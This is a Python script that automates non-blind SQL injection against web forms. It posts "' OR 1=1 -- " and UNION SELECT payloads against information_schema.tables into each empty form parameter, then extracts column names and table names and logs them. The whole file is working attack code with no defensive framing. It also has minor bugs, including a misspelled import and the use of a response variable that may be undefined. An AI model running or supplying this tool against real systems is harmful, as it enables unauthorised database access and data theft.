import requests
import time
import logger
import json
from gloabls import payloads, tables

class TestPayloadException(Exception):
    pass


def search_keys(form, param, value):
    payload = f"' OR 1=1 -- "
    headers = {'Content-Type': 'application/json'}
    
    url = form['url']
      
    new_object = {}
    
    for obj in form['body']:
        value = payloads.get(obj['name'], 'a12345678')
        if obj['name'] == param:
            value = payload
        new_object[obj['name']] = value
    
    try:  
        response = requests.post(url, headers=headers, json=new_object, timeout=5)
        response.raise_for_status() 
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        if hasattr(response, 'status_code') and response.status_code == 500:
            raise TestPayloadException("Server returned status code 500")
        return []
    
    return json.loads(response.text)['data'][0].keys()

def try_find_tables(form, param, keys):
    headers = {'Content-Type': 'application/json'}
    if 'id' in keys:
        keys.remove('id')
    field = ", ".join(keys)
    field = f"{field}"
    values = []
    
    new_object = {}
    
    for key in keys:
        temp_value = payloads.get(key, 'a12345678')
        values.append(temp_value)
    
    value = "\", \"".join(values)
    value = f"\"{value}\""
    
    url = form['url']
    
    payload = f"' UNION SELECT table_name, table_schema, null FROM information_schema.tables -- "
    
    new_object = {}

    for obj in form['body']:
        temp_value = payloads.get(obj['name'], 'a12345678')
        if obj['name'] == param:
            temp_value = payload
        new_object[obj['name']] = temp_value

    # Send the POST request with a timeout
    try:
        response = requests.post(url, headers=headers, json=new_object, timeout=5)
        response.raise_for_status()  # Raise an exception for 4xx/5xx errors
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        if hasattr(response, 'status_code') and response.status_code == 500:
            raise TestPayloadException("Server returned status code 500")
        return []

    array_of_names = [] 
    data = json.loads(response.text)['data']
    first_key = list(data[0].keys())[0]
    second_key = list(data[0].keys())[1]

    for item in data:
        temp = {
            'name': item[f'{first_key}'],
            'schema': item[f'{second_key}']
        }
        array_of_names.append(temp)
    return array_of_names

def non_blind(form):
    max_runtime = 60  # Maximum total runtime in seconds (1 minute)
    
    keys = []
    value = 'password123'
    
    tables_found = []
    
    print(f"FORM BODY: {form['body']}")
    print("*************************************")
    num_of_params = len(form['body'])
            
    for i in range(num_of_params):
        
        param_name = form['body'][num_of_params - 1- i]['name']
        print("\n*************************************")
        print(f"Trying to attack with parameter: {param_name}")
        print("*************************************")

        if form['body'][i]['value'] != '':
            print(f"Skipping parameter {param_name} since it already has a value.")
            continue
        
        start_time = time.time()

        try:
            keys = list(search_keys(form, param_name, value))
            
            logger.log_columns_found(form['url'], keys)

            table_names = try_find_tables(form, param_name, keys)
            for obj in table_names:
                if obj['name'] not in tables_found:
                    if obj['name'] in tables:
                        tables_found.append(obj)
                        logger.log_table_found(obj['name'], obj['schema'])            
            
        except TestPayloadException as e:
            print(f"Error for parameter {param_name}: {e}")
            continue
        
        if (time.time() - start_time) >= max_runtime:
            print(f"Maximum runtime exceeded for parameter: {param_name}")
            break
